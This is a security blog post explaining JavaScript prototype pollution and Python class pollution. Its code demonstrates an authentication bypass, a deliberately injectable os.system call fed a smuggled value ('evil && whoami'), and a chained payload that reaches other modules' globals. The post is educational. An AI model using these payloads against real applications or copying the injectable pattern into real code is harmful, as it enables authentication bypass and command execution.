---
date: '2025-02-05T16:18:54+07:00'
draft: false
title: 'Intro to Class Pollution in Python'
hideSummary: true
type: "blogs"
description: "Class Pollution in Python"
---
## TL;DR
This blog is about a not new but very interesting vulnerability which is familiar to Prototype Pollution in Javascript but in Python.
## Prototype Pollution
"Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects." from [PortSwigger](https://portswigger.net/web-security/prototype-pollution).
Prototype pollution itself doesn't often cause much of a trouble, but when chains with other vulnerabilities, it definitely will. As this research does not dig deep into prototype pollution, I will explain the exploit as this simple concept: In javascript, objects can inherit attributes (properties) from others via "Object Prototype".
```javascript
let a = {test: "this is a test"};
a.__proto__.polluted = "polluted";
let b = {}
console.log(b.polluted) // return polluted
```
Why this is an issue? For instance:
```javascript
var username = "Hacker";
var password = "Evil";
var users = {"admin": "REDACTED"}
function try_login(username, password) {
    if (username in users && users[username] === password) {
        console.log("Logged in");
    } else {
        console.log("Not logged in");
    }
}
try_login(username, password) // return Not logged in
```
How can we log in? If we can modify the `Object.__proto__.Hacker = "Evil"`, then we can log in because the object `users` inherit the attributes `Hacker`:
```javascript
// continue with the above snippet
var myObject = {};
myObject.__proto__[username] = password;
try_login(username, password) // return Logged in
```
This is a more realistic example:
```javascript
// continue with the above snippet
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) {
                target[key] = {};
            }
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

var theme = {background: "white", frontground: "black"}
merge(theme, JSON.parse('{"__proto__": {"Hacker2": "Evil2"}}'));
username = "Hacker2";
password = "Evil2";
try_login(username, password) // return Logged in
```
That is Prototype Pollution. There are more Prototype Pollution payloads, which help us achieve similar effect, and when this combines with the right gadget, we can exploit so much more, even [RCE](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce).
To sum up, the vulnerability is that if we can control attributes of an object in javascript (inject things NOT initialized into it), we can do a Prototype Pollution. In real life, this vuln is found when we do insecure object recursive merge, property definition by path, or object clone, reference [this](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf).

## Class Pollution in Javascript
### Background
With that logic in mind, let's take a look into Python. Python does not have Prototype, it should be safe right? Sadly, no.
### Analysis
Consider this code snippet:
```python
class Test:
    my_value = "test"
    def __init__(self):
        print("Hello from Test")

class SmallTest(Test):
    def __init__(self):
        print("Hello from SmallTest")

class mySmallTest(SmallTest):
    my_small_value = "small"
    def __init__(self):
        print("Hello from mySmallTest")

class MediumTest(Test):
    def __init__(self):
        print("Hello from MediumTest")
    def health_check(self):
        import os
        print(os.system(f"echo {self.my_value}"))
```
And try this:
```python
# continue with above snippet
test = mySmallTest()
print(test.my_value) # test
print(test.my_small_value) # small
test.my_small_value = "smaller"
test.my_value = "tester"
print(test.my_value) # tester
print(test.my_small_value) # smaller
test2 = mySmallTest()
print(test2.my_value) # test
print(test2.my_small_value) # small
```
Can we inject the class `mySmallTest` by inject object `test`? When checking the attributes of object `test`, there is a very interesting attribute called `__class__`. What if I change the attribute `my_small_value` of `test.__class__`?
```python
# continue with above snippet
print(test.__class__) # <class '__main__.mySmallTest'>
test.__class__.my_small_value = "smaller"
print(test.my_small_value) # smaller
test2 = mySmallTest()
print(test2.my_small_value) # smaller
```
So, we can change the class attributes by changing via `<object>.__class__.<attribute>`. How about `my_value` which is inherit from class `Test`
```python
# continue with above snippet
test3 = Test()
test.__class__.my_value = "tester"
print(test.my_value) # tester
print(test2.my_value) # tester
print(test3.my_value) # test
```
Nah, we cannot change it. Or is it! Investigate further, the `__class__` has attributes `__base__` which returns it parents. This means that we can access and modify the parents attributes.
```python
# continue with above snippet
print(test.__class__.__base__) # <class '__main__.SmallTest'>
print(test.__class__.__base__.__base__) # <class '__main__.Test'>
smallTest = SmallTest()
test.__class__.__base__.my_value = "tester from SmallTest"
print(test3.my_value) # test
print(smallTest.my_value) # tester from SmallTest
test.__class__.__base__.__base__.my_value = "tester from Test"
print(test3.my_value) # tester from Test
print(smallTest.my_value) # tester from SmallTest
```
So in that example snippet, we can execute arbitrary payload
```python
# continue with above snippet
test.__class__.__base__.__base__.my_value = "evil && whoami"
mediumTest = MediumTest()
mediumTest.health_check() # Try this yourself, I won't delete your system :)
```
### Accessing the globals
Moreover, we can access global attributes. The object `test` has a function called `__init__` which has `__globals__`. In this case `__init__` has `__globals__` because we provide it our code, not default, so it has the `__globals__` attribute, this holds for whatever functions we created ourselves, and not for defaults one.
```python
# continue with above snippet
our_globals_var = "CLEAN"
print(test.__init__.__globals__)
print(our_globals_var) # CLEAN
test.__init__.__globals__['our_globals_var'] = "POLLUTED"
print(our_globals_var) # POLLUTED
```
Back to the login example mention in Prototype Pollution, we can kinda bypass by Class Pollution in Python.
```python
class Theme:
    def __init__(self):
        pass

users = {"admin": "REDACTED"}

def try_login(username, password):
    if username in users and users[username] == password:
        print("Logged in")
    else:
        print("Not logged in")

username = "Hacker"
password = "Evil"
try_login(username, password)
myObject = Theme()
myObject.__init__.__globals__['users'][username] = password
try_login(username, password)
```

A more realistic example:
```python
# continue with above snippet
def merge(target, source):
    if not isinstance(source, dict):
        return
    for key in source:
        source_value = source[key]
        if isinstance(source_value, dict):
            if hasattr(target, key):
                merge(getattr(target, key), source_value)
            elif key in target:
                merge(target[key], source_value)
            else:
                return
        else:
            target.setdefault(key, source_value)

myObject2 = Theme()
merge(myObject2, {"__init__":{"__globals__":{"users":{"Hacker2": "Evil2"}}}})
username = "Hacker2"
password = "Evil2"
try_login(username, password) # Logged in
```

What if the class in different files and import as module
```python
# the_test.py
class Test:
    my_value = "test"
    def __init__(self):
        print("Hello from Test")
```
```python
from the_test import Test

test = Test()
our_globals_var = "CLEAN"
print(test.__init__.__globals__)
```
There is no `our_globals_var`, that's because it is in `the_test.py` file only, how could we access the globals in this case?
With some pyjail experience, here is my way of doing so:
```python
# continue with above snippet
print(test.__init__.__globals__['__builtins__']['help'].__repr__.__globals__['sys'].modules['__main__'].our_globals_var) # CLEAN
test.__init__.__globals__['__builtins__']['help'].__repr__.__globals__['sys'].modules['__main__'].our_globals_var = "POLLUTED"
print(our_globals_var) # POLLUTED
```
Actually, you can see that I mentions module `__main__` in above payload which will returns the main file, or the running context. We can replace it with anything that is imported (you can check by `print(test.__init__.__globals__['__builtins__']['help'].__repr__.__globals__['sys'].modules)`).
## Conclusion
As demonstrated, Class Pollution is an intriguing vulnerability and able to cause catastrophic result.
## Reference
- https://portswigger.net/web-security/prototype-pollution
- https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce
- https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf
- https://blog.abdulrah33m.com/prototype-pollution-in-python/